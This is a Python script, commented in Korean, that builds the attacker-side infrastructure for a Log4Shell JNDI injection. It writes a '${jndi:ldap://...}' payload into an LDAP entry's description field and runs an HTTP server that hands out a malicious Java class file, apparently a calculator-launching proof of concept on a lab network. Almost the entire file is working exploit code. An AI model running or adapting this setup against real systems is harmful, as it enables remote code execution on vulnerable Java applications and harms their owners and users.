import socket
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import time
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE, SUBTREE

ATTACKER_IP = '192.168.80.134'  
ATTACKER_PORT = 389           

#----------------------- ldap 서버 -----------------------#
def start_ldap_server():
    # ----------------- 서버 연결 ---------------------#
    server = Server(ATTACKER_IP, port=ATTACKER_PORT, get_info=ALL)
    admin_dn = 'cn=admin,dc=example,dc=com'
    password = 'test'
    connection = Connection(server, user=admin_dn, password=password, auto_bind=True)

    if connection.bound:
        print(f"LDAP 서버 연결 성공 및 대기 : {ATTACKER_IP}:{ATTACKER_PORT}")

    while True:
        if connection.bound:
            search_base = 'dc=example,dc=com'  
            search_filter = '(objectClass=*)'
            connection.search(search_base, search_filter, attributes=['cn', 'description'])

            response_data = '${jndi:ldap://192.168.80.134:8001/OpenCalculator.class}'

            # description에 response_data 추가
            if connection.entries:
                # DN 가져오기
                entry_dn = connection.entries[0].entry_dn  
                print(f"검색된 DN: {entry_dn}")

                # description 수정
                connection.modify(entry_dn, {'description': [(MODIFY_REPLACE, [response_data])]})
                if connection.result['result'] == 0: 
                    print(f"description 수정 성공: {response_data}")
        else:
            print("LDAP 연결이 끊어졌습니다.")

        time.sleep(1)

#----------------------- HTTP 서버 -----------------------#
class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/OpenCalculator.class":
            # OpenCalculator.class 파일 반환
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.end_headers()

            try:
                with open("OpenCalculator.class", "rb") as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found")

        else:
            super().do_GET()

# HTTP 서버 실행
def run_http_server():
    server_address = ('192.168.80.134', 8001)
    httpd = HTTPServer(server_address, CustomHandler)
    print('Starting HTTP server on port 8001...')
    httpd.serve_forever()

#----------------------- 스레드 -----------------------#
if __name__ == "__main__":
    # LDAP 서버 스레드
    ldap_thread = threading.Thread(target=start_ldap_server)
    ldap_thread.daemon = True 
    ldap_thread.start()

    # HTTP 서버 스레드
    http_thread = threading.Thread(target=run_http_server)
    http_thread.daemon = True  
    http_thread.start()

    # 계속 실행
    while True:
        time.sleep(1)
